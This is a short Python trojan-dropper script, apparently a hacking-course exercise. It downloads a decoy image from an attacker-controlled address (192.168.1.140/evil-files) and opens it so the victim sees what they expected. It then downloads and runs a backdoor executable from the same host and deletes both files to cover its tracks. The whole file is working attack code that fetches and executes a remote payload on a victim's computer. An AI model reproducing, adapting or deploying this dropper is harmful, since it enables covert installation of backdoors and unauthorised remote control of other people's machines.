import requests
import subprocess
import os
import tempfile

def download(url):
    get_response = requests.get(url)

    file_name = url.split("/")[-1] # get the last element of the list, which is the file type (.jpg, .pdf etc.)

    # file is created if it does not exist. same directory as program
    # mode is wb because the content that will be written to file is in binary
    myfile = open(file_name, mode='wb')
    myfile.write(get_response.content) # this is in binary format


# get the directory of the temp file for the victim's computer. works for all platforms
temp_directory = tempfile.gettempdir()

os.chdir(temp_directory) # cd to temp

download("http://192.168.1.140/evil-files/car.jpg") # this is the URL of the original file the victim wants to download

subprocess.Popen("car.jpg", shell=True) # open the car image on another thread using popen. This allows program to continue executing.

download("http://192.168.1.140/evil-files/backdoor_python2.exe")
subprocess.call("backdoor_python2.exe", shell=True) # open the backdoor using call. This keeps the program running until the hacker terminates the backdoor

os.remove("car.jpg")
os.remove("backdoor_python2.exe")